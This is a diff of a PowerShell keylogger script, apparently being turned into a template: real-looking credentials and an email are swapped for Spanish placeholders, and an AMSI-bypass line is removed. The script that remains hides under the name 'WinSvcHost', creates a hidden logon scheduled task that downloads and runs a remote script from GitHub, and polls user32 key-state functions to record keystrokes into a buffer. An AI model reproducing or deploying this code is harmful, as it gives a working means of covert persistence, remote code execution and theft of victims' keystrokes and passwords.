@@ -1,22 +1,15 @@
-$c=@{k='re_E5RqtiUa_DGW5Anr6waHxtoJ4Zexay5EB';t='ellgono_9@hotmail.com';u='https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1';m=5;n='WinSvcHost'}
+$c=@{k='re_TU_CLAVE';t='TU_CORREO@gmail.com';u='https://raw.githubusercontent.com/TU_USUARIO/p4wn/main/k.ps1';m=5;n='WinSvcHost'}
 
 $mx=New-Object System.Threading.Mutex($false,"Local\$($c.n)")
 if(-not $mx.WaitOne(0)){exit}
 
-$ab="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',40).SetValue(`$null,`$true)"
-$cmd="powershell -NoP -W Hidden -C $ab;iex(irm '$($c.u)')"
-schtasks /create /tn $c.n /sc onlogon /f /tr "$cmd" | Out-Null
+schtasks /create /tn $c.n /sc onlogon /f /tr "powershell -NoP -W Hidden -C iex(irm '$($c.u)')" | Out-Null
 
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-public class Wk7 {
-  [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
-  [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] s);
-  [DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicode(uint v, uint sc, byte[] s, StringBuilder b, int n, uint f);
-}
-"@
+Add-Type -MemberDefinition @'
+[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+[DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
+[DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicode(uint vk, uint sc, byte[] k, [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst=64)] System.Text.StringBuilder sb, int n, uint f);
+'@ -Name Wk7 -Namespace Qz
 
 $sb=New-Object System.Text.StringBuilder 64
 $ks=New-Object byte[] 256
@@ -28,13 +21,13 @@ $buf=''
 
 while($true){
   for($k=8;$k -lt 255;$k++){
-    if([Wk7]::GetAsyncKeyState($k) -band 0x8000){
+    if([Qz.Wk7]::GetAsyncKeyState($k) -band 0x8000){
       if(-not $dn[$k]){
         $dn[$k]=$true
         if($sp.ContainsKey($k)){ $ch=$sp[$k] }
         else {
-          [void][Wk7]::GetKeyboardState($ks)
-          $r=[Wk7]::ToUnicode([uint32]$k,0,$ks,$sb,64,0)
+          [void][Qz.Wk7]::GetKeyboardState($ks)
+          $r=[Qz.Wk7]::ToUnicode([uint32]$k,0,$ks,$sb,64,0)
           $ch=if($r -ge 1){$sb.ToString()}else{''}
         }
         if($ch){$buf+=$ch}
